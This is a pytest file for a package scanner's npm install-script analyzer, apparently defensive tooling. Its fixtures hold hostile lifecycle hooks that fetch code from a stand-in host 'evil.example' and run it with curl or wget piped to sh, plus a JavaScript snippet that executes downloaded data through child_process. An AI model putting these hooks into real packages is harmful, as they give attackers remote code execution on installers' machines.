# SPDX-License-Identifier: AGPL-3.0-or-later
from __future__ import annotations

import json
from pathlib import Path

from pkgsentry.ecosystems.npm.installer import analyze_install_scripts


def _write_pkg(tmp_path: Path, manifest: dict, files: dict[str, str] | None = None) -> Path:
    """Create an extracted npm tarball layout: <root>/package/package.json."""
    pkg = tmp_path / "package"
    pkg.mkdir(parents=True, exist_ok=True)
    (pkg / "package.json").write_text(json.dumps(manifest))
    for rel, content in (files or {}).items():
        target = pkg / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
    return tmp_path


def _rule_ids(findings) -> set[str]:
    return {f.rule_id for f in findings}


def test_clean_benign_postinstall_no_findings(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0",
                                 "scripts": {"postinstall": "node-gyp rebuild"}})
    assert analyze_install_scripts(root) == []


def test_no_scripts_no_findings(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0"})
    assert analyze_install_scripts(root) == []


def test_postinstall_net_exec_critical(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0", "scripts": {
        "postinstall": "curl http://evil.example/i.sh -o /tmp/i && sh -c /tmp/i"}})
    f = analyze_install_scripts(root)
    assert "installer.npm_lifecycle_net_exec" in _rule_ids(f)
    assert any(x.severity == "critical" for x in f)


def test_install_network_only_high(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0", "scripts": {
        "preinstall": "curl https://evil.example/beacon -o /dev/null"}})
    f = analyze_install_scripts(root)
    assert "installer.npm_lifecycle_network" in _rule_ids(f)


def test_install_subprocess_only_medium(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0", "scripts": {
        "install": "sh -c 'rm -rf /tmp/build'"}})
    f = analyze_install_scripts(root)
    assert "installer.npm_lifecycle_subprocess" in _rule_ids(f)


def test_benign_tool_chain_suppressed(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0", "scripts": {
        "prepare": "rimraf dist && tsc && webpack --mode production"}})
    assert analyze_install_scripts(root) == []


def test_referenced_js_net_exec_critical(tmp_path):
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node scripts/pi.js"}},
        files={"scripts/pi.js":
               "const https=require('https');const cp=require('child_process');"
               "https.get('http://evil.example',r=>{r.on('data',d=>cp.exec(d.toString()))});"},
    )
    f = analyze_install_scripts(root)
    assert "installer.npm_install_script_net_exec" in _rule_ids(f)


def test_referenced_js_encoded_payload(tmp_path):
    blob = "A" * 240
    root = _write_pkg(
        tmp_path,
        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node ./build.js"}},
        files={"build.js": f"const p='{blob}';module.exports=p;"},
    )
    f = analyze_install_scripts(root)
    assert "installer.npm_install_script_encoded_payload" in _rule_ids(f)


def test_suspicious_bin_flagged(tmp_path):
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0",
                                 "bin": {"x": "scripts/install.sh"}})
    f = analyze_install_scripts(root)
    assert "installer.npm_suspicious_bin" in _rule_ids(f)


def test_flat_layout_root_manifest(tmp_path):
    # Manifest directly at the extracted root (no package/ dir).
    (tmp_path / "package.json").write_text(json.dumps(
        {"name": "x", "version": "1.0.0",
         "scripts": {"postinstall": "wget http://evil.example/x | sh -c cat"}}))
    f = analyze_install_scripts(tmp_path)
    assert "installer.npm_lifecycle_net_exec" in _rule_ids(f)


def test_node_modules_manifest_ignored(tmp_path):
    # A bundled dependency manifest must NOT be treated as an install hook.
    root = _write_pkg(tmp_path, {"name": "x", "version": "1.0.0"})
    dep = tmp_path / "package" / "node_modules" / "evil"
    dep.mkdir(parents=True)
    (dep / "package.json").write_text(json.dumps(
        {"name": "evil", "scripts": {"postinstall": "curl http://evil.example | sh -c cat"}}))
    assert analyze_install_scripts(root) == []
